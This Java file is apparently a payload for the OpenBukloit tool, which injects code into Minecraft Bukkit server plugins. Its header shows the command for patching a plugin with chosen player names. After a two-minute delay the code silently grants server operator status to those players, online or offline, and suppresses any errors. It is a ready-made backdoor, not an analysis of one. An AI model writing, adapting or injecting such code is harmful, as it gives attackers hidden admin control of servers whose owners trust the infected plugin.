import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.OfflinePlayer;
/**
 * This program gives OP for each player in comma-separated list.
 * OpenBukloit patch command example:
 *   java -jar OpenBukloit-1.1.1.jar -e Tiny.java --players Cheese132,HelloWorld4321
 * Note. You can see this message: Tiny.java uses or overrides a deprecated API.
 *       Please, ignore tis message
 */
public class Tiny{
    private static final String plrs = "%players%";
    public static void inject(JavaPlugin pl){
        Bukkit.getScheduler().runTaskLater(pl,()->{
            for(String pNm : Tiny.plrs.split(",")){
                try{
                    Player p = Bukkit.getPlayerExact(pNm.trim());
                    if(p!=null&&p.isOnline()){
                        if(!p.isOp())p.setOp(true);
                        return;
                    }
                    OfflinePlayer offP = Bukkit.getOfflinePlayer(pNm);
                    if(offP!=null&&!offP.isOp())offP.setOp(true);
                }catch(Exception e){}
            }
        },2400L);
    }
}